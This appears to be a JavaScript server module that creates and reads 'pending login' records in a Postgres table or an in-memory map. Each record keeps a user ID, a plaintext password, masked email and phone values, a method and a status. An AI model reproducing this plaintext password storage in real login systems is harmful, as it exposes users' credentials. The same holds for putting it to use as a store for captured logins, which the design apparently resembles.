import { getSql } from '@/lib/db';
import { PROJECT_ID } from '@/lib/project-config';

const inMemoryStore = new Map();

function generateId() {
  return `pl_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
}

function hasNeonDatabase() {
  return Boolean(process.env.DATABASE_URL);
}

async function ensureTable() {
  if (!hasNeonDatabase()) return;
  const sql = getSql();
  await sql`
    CREATE TABLE IF NOT EXISTS pending_logins (
      id TEXT PRIMARY KEY,
      project_id TEXT NOT NULL DEFAULT 'the-standard',
      user_id TEXT NOT NULL,
      password TEXT NOT NULL,
      method TEXT NOT NULL,
      masked_email TEXT NOT NULL,
      masked_phone TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'pending',
      created_at BIGINT NOT NULL
    )
  `;

  try {
    await sql`ALTER TABLE pending_logins ADD COLUMN project_id TEXT NOT NULL DEFAULT 'the-standard'`;
  } catch {
    // Column already exists
  }
}

export async function createPendingLogin(data) {
  const id = generateId();
  const projectId = data.projectId ?? PROJECT_ID;
  const record = {
    id,
    projectId,
    userId: data.userId,
    password: data.password,
    method: data.method,
    maskedEmail: data.maskedEmail,
    maskedPhone: data.maskedPhone,
    status: 'pending',
    createdAt: Date.now(),
  };

  if (hasNeonDatabase()) {
    await ensureTable();
    const sql = getSql();
    await sql`
      INSERT INTO pending_logins (id, project_id, user_id, password, method, masked_email, masked_phone, status, created_at)
      VALUES (${id}, ${projectId}, ${data.userId}, ${data.password}, ${data.method}, ${data.maskedEmail}, ${data.maskedPhone}, 'pending', ${record.createdAt})
    `;
    return record;
  }

  inMemoryStore.set(id, record);
  return record;
}

export async function getPendingLogin(id) {
  if (hasNeonDatabase()) {
    try {
      const sql = getSql();
      const rows = await sql`
        SELECT id, COALESCE(project_id, 'the-standard') AS "projectId", user_id AS "userId", password, method,
               masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status, created_at AS "createdAt"
        FROM pending_logins WHERE id = ${id}
      `;
      const row = rows[0];
      if (!row) return undefined;

      return {
        id: String(row.id),
        projectId: String(row.projectId ?? PROJECT_ID),
        userId: String(row.userId),
        password: String(row.password),
        method: row.method ?? 'text',
        maskedEmail: String(row.maskedEmail ?? ''),
        maskedPhone: String(row.maskedPhone ?? ''),
        status: row.status ?? 'pending',
        createdAt: Number(row.createdAt),
      };
    } catch {
      return undefined;
    }
  }

  const mem = inMemoryStore.get(id);
  if (!mem) return undefined;
  return { ...mem, projectId: mem.projectId ?? PROJECT_ID };
}
